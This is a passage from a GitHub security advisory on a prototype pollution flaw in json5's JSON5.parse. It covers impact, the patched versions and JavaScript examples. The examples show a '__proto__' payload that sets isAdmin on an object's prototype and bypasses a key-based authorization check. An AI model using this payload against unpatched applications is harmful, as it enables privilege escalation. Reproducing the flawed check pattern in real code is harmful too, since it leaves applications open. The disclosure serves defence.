However, polluting the prototype of a single object can have significant security impact for an application if the object is later used in trusted operations.\n\n## Impact\nThis vulnerability could allow an attacker to set arbitrary and unexpected keys on the object returned from `JSON5.parse`. The actual impact will depend on how applications utilize the returned object and how they filter unwanted keys, but could include denial of service, cross-site scripting, elevation of privilege, and in extreme cases, remote code execution.\n\n## Mitigation\nThis vulnerability is patched in json5 v2.2.2 and later. A patch has also been backported for json5 v1 in versions v1.0.2 and later.\n\n## Details\nSuppose a developer wants to allow users and admins to perform some risky operation, but they want to restrict what non-admins can do. To accomplish this, they accept a JSON blob from the user, parse it using `JSON5.parse`, confirm that the provided data does not set some sensitive keys, and then performs the risky operation using the validated data:\n\n```js\nconst JSON5 = require('json5');\n\nconst doSomethingDangerous = (props) => {\n if (props.isAdmin) {\n console.log('Doing dangerous thing as admin.');\n } else {\n console.log('Doing dangerous thing as user.');\n\n }\n};\n\nconst secCheckKeysSet = (obj, searchKeys) => {\n let searchKeyFound = false;\n Object.keys(obj).forEach((key) => {\n if (searchKeys.indexOf(key) > -1) {\n searchKeyFound = true;\n }\n });\n return searchKeyFound;\n};\n\nconst props = JSON5.parse('{\\\"foo\\\": \\\"bar\\\"}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n doSomethingDangerous(props); // \\\"Doing dangerous thing as user.\\\"\n} else {\n throw new Error('Forbidden...');\n}\n```\n\nIf an attacker attempts to set the `isAdmin` key, their request will be rejected:\n\n```js\nconst props = JSON5.parse('{\\\"foo\\\": \\\"bar\\\", \\\"isAdmin\\\": true}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\ndoSomethingDangerous(props);\n} else {\n throw new Error('Forbidden...'); // Error: Forbidden...\n}\n```\n\nHowever, attackers can instead set the `__proto__` key to `{\\\"isAdmin\\\": true}`. `JSON5` will parse this key and will set the `isAdmin` key on the prototype of the returned object, allowing the attacker to bypass the security check and run their request as an admin:\n\n```js\nconst props = JSON5.parse('{\\\"foo\\\": \\\"bar\\\", \\\"__proto__\\\": {\\\"isAdmin\\\": true}}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n doSomethingDangerous(props); // \\\"Doing dangerous thing as admin.\\\"\n} else {\n throw new Error('Forbidden...');\n}\n```\n","url":"https://github.com/advisories/GHSA-9c47-m6qq-7p4h"}}}
